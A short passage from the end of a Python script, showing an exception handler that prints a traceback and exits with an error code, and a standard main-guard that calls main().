        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()